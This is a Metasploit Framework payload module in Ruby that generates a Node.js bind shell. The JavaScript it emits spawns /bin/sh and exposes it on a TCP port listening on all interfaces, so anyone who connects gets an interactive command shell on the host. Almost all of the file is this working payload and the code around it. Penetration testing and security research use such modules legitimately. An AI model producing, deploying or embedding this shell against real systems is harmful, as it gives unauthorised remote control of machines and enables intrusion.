
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/handler/bind_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3

	include Msf::Payload::Single
	include Msf::Sessions::CommandShellOptions

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'Command Shell, Bind TCP (via JS)',
			'Description'   => 'Creates an interactive shell via JS',
			'Author'        => [
        'RageLtMan', # Port to MSF
        'evilpacket' # Original shell at https://github.com/evilpacket/node-shells/blob/master/node_revshell.js
        ],
			'License'       => BSD_LICENSE,
			'Platform'      => 'js',
			'Arch'          => ARCH_CMD,
			'Handler'       => Msf::Handler::BindTcp,
			'Session'       => Msf::Sessions::CommandShell,
			'PayloadType'   => 'js',
			'Payload'       =>
				{
					'Offsets' => { },
					'Payload' => ''
				}
			))
	end

	#
	# Constructs the payload
	#
	def generate
		vprint_good(command_string)
		return super + command_string
	end

	#
	# Returns the command string to use for execution
	#
	def command_string
		cmd   = <<EOS
var net = require("net"),
util = require("util"),
spawn = require("child_process").spawn,
sh = spawn("/bin/sh",[]);
var server = net.createServer(function (c) {
        c.pipe(sh.stdin);
        util.pump(sh.stdout,c);
});
server.listen(#{datastore['LPORT']}, "0.0.0.0");
EOS
    return "#{cmd.gsub("\n",'').gsub(/\s+/,' ').gsub(/[']/, '\\\\\'')}"
  end
end
